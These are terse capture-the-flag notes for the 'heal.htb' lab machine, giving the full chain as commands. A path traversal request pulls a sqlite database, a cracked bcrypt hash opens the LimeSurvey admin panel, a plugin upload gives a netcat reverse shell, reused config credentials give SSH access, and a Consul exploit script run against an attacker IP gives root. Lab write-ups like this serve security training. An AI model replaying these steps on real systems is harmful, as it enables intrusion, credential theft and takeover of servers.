we download sqlite3 file 
with burpsuite
use this req
GET /download?filename=../../storage/development.sqlite3 HTTP/1.1

Host: api.heal.htb

Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ

Accept-Language: en-US,en;q=0.9

Accept: application/json, text/plain, */*

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36

Origin: http://heal.htb

Referer: http://heal.htb/

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

then we change file format from pdf to sqlite3
and found 
![[Pasted image 20250130123636.png]]
then we cracked hash that we found

$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
format 3200 hashcat
cracked: password - 147258369
that give for us access in this subdomain 
http://take-survey.heal.htb/index.php/admin/

then we upload plugin and get rce Y1LD1R1M, ZIP FILE SHOULD BE NAME LIKE A NAME PLUGIN!
nc -lvnp 1337
then we found config file
www-data@heal:~/limesurvey/application/config$ cat config.php
'connectionString' => `'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;`',
'username' => 'db_user',
'password' => `AdmiDi0_pA$$w0rd` 
its password for ron in ssh

ssh -L 1234:localhost:8500 ron@10.10.11.46
exploit consul v1:
python3 51117.py 127.0.0.1 1234 10.10.15.37 2222 0
we get acccess to root


